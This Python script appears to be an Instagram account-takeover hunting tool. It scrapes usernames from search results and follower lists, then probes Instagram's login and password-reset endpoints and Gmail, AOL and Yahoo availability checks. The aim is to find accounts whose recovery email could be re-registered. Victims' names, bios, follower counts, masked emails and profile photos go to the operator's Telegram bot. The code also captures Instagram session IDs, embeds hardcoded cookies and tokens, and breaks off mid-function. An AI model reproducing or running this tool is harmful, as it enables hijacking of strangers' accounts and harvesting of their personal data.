import os
from os import system
try:
	from requests import *
	from uuid import uuid4
	import sys
	from random import *
	from os import system
	from time import sleep
	from user_agent import generate_user_agent
	import gdolib
	from names import *
	import requests
	import json
	import mechanize
	import cfonts
	import say
	
	import webbrowser
except ModuleNotFoundError:
	os.system('pip install python-cfonts')
	os.system('pip install say')
	os.system('pip install requests')
	os.system('pip install mechanize')
	os.system('pip install names')	
	os.system('pip install user_agent')
	os.system('pip install time')
	os.system('pip install uuid')
	os.system('pip install gdolib')
	

system('clear')

Z = '\033[1;31m' 
X = '\033[1;33m' 
Z1 = '\033[2;31m' 
F = '\033[2;32m' 
A = '\033[2;34m'
j = '\033[2;35m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
E = '\033[1;31m'
from cfonts import render
import say
G = ['red','green','white']
v = str(choice(G))
b = str(choice(G))
k = str(choice(G))
output = render(' I R A Q',colors=[v, b, k],align='left')
print(output)
print(F+"_"*55 )
Token = input(B+"ENTER YOUR TOKEN BOT TELLEGRAM => "+Z)
IDd = input(B+"ENTER YOIR ID ACCOUNT TELLEGRAM => "+Z)
system('clear')
class alaa:
	def gam(email,us):
		user=str(us)
		emai=str(email)
		tokk=Token
		iidd = IDd
		url = 'https://android.clients.google.com/setup/checkavail'
		headers = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
		data = json.dumps({
		'username':emai,
		'version':'3',
		'firstName':'Alaabasha',
		'lastName':'Alaabasha'
	})
		check = post(url,data=data,headers=headers)
		if check.json()['status'] == 'SUCCESS':
				url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
				headers = {
    "Content-Length": "317",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": "Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG, en-US",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"}
				data = {
"user_email":us,
"device_id":uuid4(),
"guid":uuid4()}
				rew = post(url,headers=headers,data=data)
				if '*' in rew.text:
							rest=rew.json()['obfuscated_email']
							print(F+f"AVAILABLE IN GMAIL ==> {emai}")
							hd = {
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
							rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()
							photo = get(rer['data']['user']['profile_pic_url'])
							with open('nk.jpg','wb') as d:
								d.write(photo.content)
							Name = rer['data']['user']['full_name']
							FOLO = rer['data']['user']['edge_followed_by']['count']
							bayo = rer['data']['user']['biography']
							ID = rer['data']['user']['id']
							lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['data']
							tex = (f'''*--------------------*
NAME => {Name}
USER => {user}
EMAIL => {email}
FOLLOWERS => {FOLO}
BAYO => {bayo}
DATE => {lok}
REST => {rest}
ID => {ID}
LINK => https://www.instagram.com/{user}
DeV => @M_L_F''')
							post(f'https://api.telegram.org/bot{tokk}/sendDocument?chat_id={iidd}&caption={tex}', files={'document':open('nk.jpg', 'rb')})
							system("rm -rf nk.jpg")
				else:
					hd = {
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
					rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()
					photo = get(rer['data']['user']['profile_pic_url'])
					with open('nk.jpg','wb') as d:
								d.write(photo.content)
					Name = rer['data']['user']['full_name']
					FOLO = rer['data']['user']['edge_followed_by']['count']
					bayo = rer['data']['user']['biography']
					ID = rer['data']['user']['id']
					lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['data']
					tex = (f'''*--------------------*
NAME => {Name}
USER => {user}
EMAIL => {email}
FOLLOWERS => {FOLO}
BAYO => {bayo}
DATE => {lok}
REST => FALSE
ID => {ID}
LINK => https://www.instagram.com/{user}
DeV => @M_L_F''')
					post(f'https://api.telegram.org/bot{tokk}/sendDocument?chat_id={iidd}&caption={tex}', files={'document':open('nk.jpg', 'rb')})
					system("rm -rf nk.jpg")
		elif check.json()['status'] =='USERNAME_UNAVAILABLE':
			print(C+f"NOT AVILIBLE IN GMAIL => {emai}")
		else:
				if gdolib.check_email.gmail(emai)['status'] == 'Success':
					print(F+f"AVILIBLE IN GMAIL => {emai}")
					url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
					headers = {
    "Content-Length": "317",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": "Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG, en-US",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"}
					data = {
"user_email":email,
"device_id":uuid4(),
"guid":uuid4()}
					rew = post(url,headers=headers,data=data)
					if '*' in rew.text:
							rest=rew.json()['obfuscated_email']
							print(F+f"AVAILABLE IN GMAIL ==> {emai}")
							hd = {
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
							rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()
							photo = get(rer['data']['user']['profile_pic_url'])
							with open('nk.jpg','wb') as d:
								d.write(photo.content)
							Name = rer['data']['user']['full_name']
							FOLO = rer['data']['user']['edge_followed_by']['count']
							bayo = rer['data']['user']['biography']
							ID = rer['data']['user']['id']
							lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['data']
							tex = (f'''*--------------------*
NAME => {Name}
USER => {user}
EMAIL => {email}
FOLLOWERS => {FOLO}
BAYO => {bayo}
DATE => {lok}
REST => {rest}
ID => {ID}
LINK => https://www.instagram.com/{user}
DeV => @M_L_F''')
							post(f'https://api.telegram.org/bot{tokk}/sendDocument?chat_id={iidd}&caption={tex}', files={'document':open('nk.jpg', 'rb')})
							system("rm -rf nk.jpg")
					else:
							hd = {
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
							rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()

							photo = get(rer['data']['user']['profile_pic_url'])
							with open('nk.jpg','wb') as d:
								d.write(photo.content)
							Name = rer['data']['user']['full_name']
							FOLO = rer['data']['user']['edge_followed_by']['count']
							bayo = rer['data']['user']['biography']
							ID = rer['data']['user']['id']
							lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['data']
							tex = f'''*--------------------*
NAME => {Name}
USER => {user}
EMAIL => {email}
FOLLOWERS => {FOLO}
BAYO => {bayo}
DATE => {lok}
REST => FLASE
ID => {ID}
LINK => https://www.instagram.com/{user}
DeV => @M_L_F'''
							post(f'https://api.telegram.org/bot{tokk}/sendDocument?chat_id={iidd}&caption={tex}', files={'document':open('nk.jpg', 'rb')})
							system("rm -rf nk.jpg")
				elif gdolib.check_email.gmail(emai)['status'] == 'error':
					print(C+f"NOT AVILIBLE IN GMAIL => {emai}")
				
	def g_t(emai,took,iidd):
		url = 'https://android.clients.google.com/setup/checkavail'
		headers = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
		data = json.dumps({
		'username':emai,
		'version':'3',
		'firstName':'Alaabasha',
		'lastName':'Alaabasha'
	})
		check = post(url,data=data,headers=headers)
		if check.json()['status'] == 'SUCCESS':
			print(F+f"AVAILABLE IN GMAIL ==> {emai}")
			post(f'''https://api.telegram.org/bot{took}/sendMessage?chat_id={iidd}&text=NEW AVAILABLE IN TWITTER •
Email => {emai}''')
		else:
			print(Z+f"NOT AVAILABLE IN GMAIL ==> {emai}")	
					
	def aol(uss,eail):
		took=str(Token)
		iidd = str(IDd)
		email = str(eail)
		check = gdolib.check_email.aol(email)
		if check['status']=='Success':
			print(F+f"AVAILABLE IN AOL => {email} ")
			url = "https://i.instagram.com/api/v1/accounts/send_password_reset/"
			headers = {
    "Content-Length": "317",
    "Content-Type": "application/x-www-form-urlencoded; charset\u003dUTF-8",
    "Host": "i.instagram.com",
    "Connection": "Keep-Alive",
    "User-Agent": "Instagram 6.12.1 Android (24/7.0; 480dpi; 1080x1920; LENOVO/Lenovo; Lenovo K53a48; K53a48; qcom; ar_EG)",
    "Cookie2": "$Version\u003d1",
    "Accept-Language": "ar-EG, en-US",
    "X-IG-Connection-Type": "MOBILE(LTE)",
    "X-IG-Capabilities": "AQ\u003d\u003d",
    "Accept-Encoding": "gzip"}
			data = {
"user_email":uss,
"device_id":uuid4(),
"guid":uuid4()}
			rew = post(url,headers=headers,data=data)
			if '*' in rew.text:
							rest=rew.json()['obfuscated_email']
							hd = {
'user-agent':str(generate_user_agent()),
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
							rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={uss}",headers=hd).json()
							
							photo = get(rer['data']['user']['profile_pic_url'])
							with open('nk.jpg','wb') as d:
								d.write(photo.content)
							Name = rer['data']['user']['full_name']
							FOLO = rer['data']['user']['edge_followed_by']['count']
							bayo = rer['data']['user']['biography']
							ID = rer['data']['user']['id']
							lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['data']
							tex = (f'''*--------------------*
NAME => {Name}
USER => {uss}
EMAIL => {email}
FOLLOWERS => {FOLO}
BAYO => {bayo}
DATE => {lok}
REST => {rest}
ID => {ID}
LINK => https://www.instagram.com/{uss}
DeV => @M_L_F''')
							post(f'https://api.telegram.org/bot{took}/sendDocument?chat_id={iidd}&caption={tex}', files={'document':open('nk.jpg', 'rb')})
							system("rm -rf nk.jpg")
			else:
					hd = {
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR1GMxGxYNiyJ_Qr59WPgznfqJKtnAogUcpBr_5hDMSoxwjz'}
					rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={uss}",headers=hd).json()

					photo = get(rer['data']['user']['profile_pic_url'])
					with open(f'nk.jpg','wb') as d:
								d.write(photo.content)
					Name = rer['data']['user']['full_name']
					FOLO = rer['data']['user']['edge_followed_by']['count']
					bayo = rer['data']['user']['biography']
					ID = rer['data']['user']['id']
					lok = get(f"https://o7aa.pythonanywhere.com/?id={ID}").json()['data']
					tex = (f'''*--------------------*
NAME => {Name}
USER => {uss}
EMAIL => {email}
FOLLOWERS => {FOLO}
BAYO => {bayo}
DATE => {lok}
REST => FALSE
ID => {ID}
LINK => https://www.instagram.com/{uss}
DeV => @M_L_F''')
					post(f'https://api.telegram.org/bot{took}/sendDocument?chat_id={iidd}&caption={tex}', files={'document':open('nk.jpg', 'rb')})
					system("rm -rf nk.jpg")
		else:
				print(C+f"NOT AVAILABLE IN AOL => {email} ")
	def insta(us,emai):
				headu= {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*','Cookie':'missing','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US',
'X-IG-Capabilities':'3brTvw==',
'X-IG-Connection-Type':'WIFI',
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
'Host':'i.instagram.com'}
				data = {'uuid':uuid4(),  'password':'ALAA#BASHA102','username':emai,'device_id':uuid4(),
'from_reg':'false','_csrftoken':'missing','login_attempt_countn':'0'}
				try:
					ala =post('https://i.instagram.com/api/v1/accounts/login/', headers=headu, data=data).json()
					
					if ala['message'] == 'The password you entered is incorrect. Please try again.':
						print(X+f"AVILIBLE IN INSTA => {emai}")
						alaa.gam(emai,us)
					elif ala['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
						print(X+f"AVILIBLE IN INSTA => {emai}")
						alaa.gam(emai,us)
					elif ala['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
						print(Z+f"NOT AVAILABLE IN INSTA => {emai} ")
					else:
						print(Z+f"NOT AVAILABLE IN INSTA => {emai} ")
				except:
						print(A+f"The network is not working, waiting {X}•")
						sleep(20)
	def i(us,eai):
				headu= {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*','Cookie':'missing','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US',
'X-IG-Capabilities':'3brTvw==',
'X-IG-Connection-Type':'WIFI',
'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
'Host':'i.instagram.com'}
				data = {'uuid':uuid4(),  'password':'ALAA#BASHA102','username':eai,'device_id':uuid4(),
'from_reg':'false','_csrftoken':'missing','login_attempt_countn':'0'}
				try:
					ala =post('https://i.instagram.com/api/v1/accounts/login/', headers=headu, data=data).json()
					
					if ala['message'] == 'The password you entered is incorrect. Please try again.':
						print(X+f"AVILIBLE IN INSTA => {eai}")
						alaa.aol(us,eai)
					elif ala['message'] == 'The password you entered is incorrect. Please try again or log in with Facebook.':
						print(X+f"AVILIBLE IN INSTA => {eai}")
						alaa.aol(us,eai)
					elif ala['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
						print(Z+f"NOT AVAILABLE IN INSTA => {eai} ")
					else:
						print(Z+f"NOT AVAILABLE IN INSTA => {eai} ")
				except:
						print(A+f"The network is not working, waiting {X}•")
						sleep(20)
				
	def ser(sis,user):
		user=str(user)
		sis=str(sis)
		hea = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie':f'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; datr=H9vzYq35j3WCu3W5Jw-BuqMb; dpr=1.75; csrftoken=BoAPbH25tOOL4jUvTQTtrbEqLN44pjnT; ds_user_id=10851247180; shbid="2195,10851247180,1693733333:01f781e1606e53e58d1108b28b348650b4413de9e963e2af156f7f8349ac2dcc009bb77c"; shbts="1662197333,10851247180,1693733333:01f7922667728add527198adb9bb332520bd0b4a233ecb4c650da3524912630fa3ac7645"; sessionid={sis}; rur="RVA,10851247180,1693912293:01f78ed1bfb4b31b309a892edebcbf222a838f50d84e29bcbbf806e997099b1b5deca4b9"',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
'x-asbd-id':'198387',
'x-csrftoken':'BoAPbH25tOOL4jUvTQTtrbEqLN44pjnT',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR16wNjyuckc0qk4ogcBIWjOuYHm4V6EFi8U2XCJriHI4KVv',
'x-instagram-ajax':'1006141724',}
		data = {'count': '12121212',
		'search_surface': 'follow_list_page'}
		hd = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar,en;q=0.9',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Windows"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent': generate_user_agent(),
'x-csrftoken':'8uoEYgxjJwHho1KYWE6s2LwIYf6CSgKb',
'x-ig-app-id':'936619743392459',
'x-ig-www-claim':'hmac.AR1cjP7xqazJ469Nhp3UMEg014y0pAUnf-plXYyvO3tupGkS'}
		rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()
		IID = rer['data']['user']['username']
		al = get(f"https://i.instagram.com/api/v1/friendships/{IID}/following/",headers=hea,data=data).json()
		alf=al['users']
		for i in alf:
			folo = i['username']
			Following= f'User :- {folo}'
			print(F+Following);open("k.txt","a").write(folo+'\n')
		sleep(2)
		system('clear')
	def login():
	   	global Token,IDd
	   	tok=str(Token)
	   	iid=str(IDd)
	   	u = input(B+'ENTER YOUR USERNAME :- '+Z)
	   	p = input(B+"ENTER YOUR PASSWORD :- "+Z)
	   	h = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'content-length':'322',
'content-type':'application/x-www-form-urlencoded',
'cookie':'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; shbid="10365,53358207778,1691684390:01f73f547c1ec96deebeea0d54830b380e0f6fb12a7f193216a61365a0dd54aa7910e0da"; shbts="1660148390,53358207778,1691684390:01f7b7a7daf2988ef2a998bed11b633ab01022f88d4cb7c1cdf11cbd687b168fe2c3b42f"; dpr=1.75; datr=H9vzYq35j3WCu3W5Jw-BuqMb; rur="LDC,10851247180,1691685227:01f7384326eadde6b86b6e846d607a492aa0dc1129c56a6dfa9f24656775a17ed6d951a4"; csrftoken=0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-prefers-color-scheme':'light',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-origin',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
'viewport-width':'412',
'x-asbd-id':'198387',
'x-csrftoken':'0RaVmP0mL1aHKLLXLO6UIraTr4mAQNPg',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR0WvdbBzERaM1Ho5PaSxxSd8SpAKdFzw6OZ-3tawfWifKhp',
'x-instagram-ajax':'730e073623b1',
'x-requested-with':'XMLHttpRequest',}
	   	Login_IG = post("https://www.instagram.com/accounts/login/ajax/",headers=h,data={'username': u,'enc_password':"#PWD_INSTAGRAM_BROWSER:0:&:"+p})
	   	if "userId" in Login_IG.text:
	   		print(F+f"DONE LOGIN IN ACCOUNT {X}!")
	   		cookies = Login_IG.cookies.get_dict()['sessionid']
	   		coo = f"DONE GET SESSIONID :-  {cookies}"
	   		open('sessioni.txt','a').write(coo+"\n")
	   		tlg = f'https://api.telegram.org/bot{tok}/sendDocument?chat_id={iid}&caption=DONE GET SESSIONID\n\n'
	   		files = {'document' :open('sessionid.txt','rb')}
	   		post(tlg,files=files)
	   		print(F+'DONE SEND INFO TO TELLEGRAM !')
	   		sleep(3)
	   		system('clear')
	   		y()
	   	elif 'challenge' in Login_IG.text:
	   		print(B+f"YOUR ACCOUNT IS {X}SECURE !")
	   		sleep(3)
	   		system('clear')
	   		alaa.login()
	   	elif '"ip_block"' in Login_IG.text:
	   		print(X+f'YOUR IP IS {Z}BLOCKED !')
	   		sleep(3)
	   		system('clear')
	   		alaa.login()
	   	else:
	   		print(Z+f"USERNAME OR PASSWORD IS {Z}ERROR !")
	   		sleep(3)
	   		system('clear')
	   		alaa.login()
	def se(sis,user):
		user=str(user)
		hea= {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'cookie':f'mid=YvPaYAABAAG3pnL6OA7VEBlLVuDo; ig_did=47F0CEA6-3B69-4576-A88E-23F3CE15444E; ig_nrcb=1; datr=H9vzYq35j3WCu3W5Jw-BuqMb; dpr=1.75; csrftoken=BoAPbH25tOOL4jUvTQTtrbEqLN44pjnT; ds_user_id=10851247180; shbid="2195,10851247180,1693733333:01f781e1606e53e58d1108b28b348650b4413de9e963e2af156f7f8349ac2dcc009bb77c"; shbts="1662197333,10851247180,1693733333:01f7922667728add527198adb9bb332520bd0b4a233ecb4c650da3524912630fa3ac7645"; sessionid={sis}; rur="RVA,10851247180,1693912293:01f78ed1bfb4b31b309a892edebcbf222a838f50d84e29bcbbf806e997099b1b5deca4b9"',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'"Chromium";v="105", "Not)A;Brand";v="8"',
'sec-ch-ua-mobile':'?1',
'sec-ch-ua-platform':'"Android"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
'x-asbd-id':'198387',
'x-csrftoken':'BoAPbH25tOOL4jUvTQTtrbEqLN44pjnT',
'x-ig-app-id':'1217981644879628',
'x-ig-www-claim':'hmac.AR16wNjyuckc0qk4ogcBIWjOuYHm4V6EFi8U2XCJriHI4KVv',
'x-instagram-ajax':'1006141724',}
		data = {'count': '12121212',
		'search_surface': 'follow_list_page'}
		hd = {'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar,en;q=0.9',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-ch-ua':'"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Windows"',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent': generate_user_agent(),
'x-csrftoken':'8uoEYgxjJwHho1KYWE6s2LwIYf6CSgKb',
'x-ig-app-id':'936619743392459',
'x-ig-www-claim':'hmac.AR1cjP7xqazJ469Nhp3UMEg014y0pAUnf-plXYyvO3tupGkS'}
		rer = get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={user}",headers=hd).json()
		ID = rer['data']['user']['username']
		al = get(f"https://i.instagram.com/api/v1/friendships/{ID}/followers/",headers=hea,data=data).json()
		alf=al['users']
		for i in alf:
			folo = i['username']
			Following= f'User :- {folo}'
			print(F+Following);open("k.txt","a").write(folo+'\n')
		sleep(2)
		system('clear')
	def search():
			hd = {
'accept':'*/*',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',
'access-control-request-headers':'x-asbd-id,x-csrftoken,x-ig-app-id,x-ig-www-claim,x-instagram-ajax',
'access-control-request-method':'GET',
'origin':'https://www.instagram.com',
'referer':'https://www.instagram.com/',
'sec-fetch-dest':'empty',
'sec-fetch-mode':'cors',
'sec-fetch-site':'same-site',
'user-agent':str(generate_user_agent())}
			u = str(randint(1,7))
			s = str(''.join(choice('1234567890') for i in range(int(u))))
			e = str(choice([get_first_name(),get_full_name().replace(' ',''),get_last_name()]))+s
			XC = str(choice('asdfghjklmnbvcxzqwertyuiop1234567890') for i in range(int(u)))+s
			eer =str(choice([e,XC]))
			req = get(f"https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query={eer}&rank_token=0.6481600571666157&include_reel=true",headers=hd).json()['users']
			for i in req:
				print("UserName => "+i['user']['username'])
				open("k.txt","a").write(i['user']['username']+"\n")
	def f_am(Email):
		iidd = str(IDd)
		took=str(Token)
		rl = 'https://android.clients.google.com/setup/checkavail'
		hg= {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
		ta = json.dumps({
		'username':Email,
		'version':'3',
		'firstName':'Alaabasha',
		'lastName':'Alaabasha'
	})
		ali = post(rl,data=ta,headers=hg)
		sleep(int(randint(1,3)))
		if ali.json()['status'] == 'SUCCESS':
			print(X+f"AVAILABLE IN GMAIL ==> {Email}")
			alaa.fce(Email)
		else:
			print(Z+f"NOT AVAILABLE IN GMAIL ==> {Email}")
	def yah(Email):
		took = str(Token)
		iidd = str(IDd)
		emal = Email
		rd= {
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Content-Length': '17973',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Cookie': 'APID=UP139a7583-ebf0-11eb-b505-06ebe7a65878; B=1gu92j5gg4sv7&b=3&s=64; A1=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; A3=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk; GUC=AQEBAQFg_FZhBEIc3QQ6; cmp=t=1627550703&j=0; APIDTS=1627550737; A1S=d=AQABBCoF-2ACEDfMWHRNdZQ9oaAHUO4YHqMFEgEBAQFW_GAEYQAAAAAA_eMAAAcI53MCYZkieRg&S=AQAAAuJmx1yIDVMiY71k2AGooYk&j=WORLD; AS=v=1&s=9z9sgq95&d=A6103d241|eavlddr.2Sqtm1snR4vumZPgWEv2CX8ETv8qsCVpXUOAi6BcDaqYAawFRdXZOH3x1ZhIOOPANiSybHZ1j1IBJfKp_yUQeVT2a7U2iFeceXk3DV8Yf6fdA4Mb3M_1A3WY2rpfLpkN2geA1AHRb_QuK0p_gvRBC25hCJqX6_BqNWBCQZ40y2vcTOUrMHZQRGCPbygJ4jCC1pmj16D_TNVaFo68GkkgrxHiFpLQEP9zBsfEM9g8FM8Qd3Gs8oJHQRyvyel09x3uEdniEFCXR93nRCcOMMKCI7xvW239gVcz1Gs_5hmZv6aql00Zge0HJaK6YKPDg9Q7rFfMe7pJry4gCuNMiq_bH9TeBHQEGjqLCJR_d8hcSFHxUnNah4D8.hwV7o1hyYUKQl2Pw6aVKPizRyscmuz0Rwa1LUKGV0O2ls2MSsR4g4TzVlLObvUuKBdrdIJJD3Em1NsNsXKj3uyr.XgZV3E09rJQbldIcePNMPkT7jJjydoGuIBVbqutW0MgHN5IShbRcy6cVifEmil4551or5xaGO5kNpIDCbjUmhD8.MnIfBGRlSIITVGGoQhj3l5TBA742dFc_zcZJmtF5XIrHTr_wMpbpc3ZzD1SgWTDMvySFcsTwH8DdIPhUw4c5QUfyh0kECQFV6OG2M9B06c1wayVg_OiVhy6B6u8Q5AHjbRhsacLtI8K7KxG3JA6oxXmOla3MUX35XvU2axN9DChrM3gpJlJYgmqxV454FF23dysnz4sixK8tvwUc.4EiOU_5OfNGmgZpA.MiCif_oYX3m92DAi38QIl~A',
    'Host': 'login.yahoo.com',
    'Origin': 'https://login.yahoo.com',
    'Referer': 'https://login.yahoo.com/account/create?.lang=ar-JO&src=homepage&specId=yidReg&done=https%3A%2F%2Fwww.yahoo.com',
    'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    'sec-ch-ua-mobile': '?0',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': str(generate_user_agent()),
    'X-Requested-With': 'XMLHttpRequest'}
